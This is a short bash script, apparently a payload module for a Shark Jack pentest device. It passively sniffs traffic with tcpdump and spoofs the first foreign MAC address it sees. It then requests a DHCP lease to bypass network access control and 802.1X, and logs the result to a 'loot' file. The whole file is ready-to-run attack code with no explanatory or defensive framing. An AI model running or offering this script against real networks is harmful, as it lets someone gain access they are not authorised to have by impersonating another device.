#!/bin/bash
# NAC / 802.1X Bypass module
# author: turkkat284
# description: scanns for MAC's, spoofes the first MAC and request an ip to bypass NAC / 802.1X

source /usr/bin/sharkjack_display_helpers.sh 2>/dev/null || true

LOOT_FILE="/root/loot/triage_pro/nac_$(date +%s).txt"
CAP_FILE="/tmp/nac_capture.cap"

DISPLAY_CLEAR
DISPLAY_TEXT "NAC Bypass..." 0 0
DISPLAY_TEXT "Sniffing MACs" 0 16
DISPLAY_TEXT "Duration: 10s" 0 32

timeout 10 tcpdump -i eth0 -n -e -c 10 > $CAP_FILE 2>/dev/null

TARGET_MAC=$(grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' $CAP_FILE | grep -v "$(cat /sys/class/net/eth0/address)" | head -n 1)

if [ -z "$TARGET_MAC" ]; then
    DISPLAY_CLEAR
    DISPLAY_TEXT "=== NAC RESULT ===" 0 0
    DISPLAY_TEXT "MAC: Not Found" 0 16
    DISPLAY_TEXT "Status: Failed" 0 32
    sleep 5
    exit 1
fi

DISPLAY_CLEAR
DISPLAY_TEXT "Spoofing MAC..." 0 0
DISPLAY_TEXT "MAC: $TARGET_MAC" 0 16

ifconfig eth0 down
ifconfig eth0 hw ether "$TARGET_MAC"
ifconfig eth0 up

udhcpc -i eth0 -n -q >/dev/null 2>&1
NEW_IP=$(ifconfig eth0 | grep -oP 'inet addr:\K\S+' || hostname -I | awk '{print $1}')

DISPLAY_CLEAR
DISPLAY_TEXT "=== NAC RESULT ===" 0 0
DISPLAY_TEXT "MAC: $TARGET_MAC" 0 16
DISPLAY_TEXT "IP: ${NEW_IP:-No IP Obtained}" 0 32
DISPLAY_TEXT "Status: Bypassed" 0 48

{
    echo "--- NAC Bypass Report ---"
    echo "Date: $(date)"
    echo "Spoofed MAC: $TARGET_MAC"
    echo "Assigned IP: ${NEW_IP:-No IP}"
} > "$LOOT_FILE"

sleep 5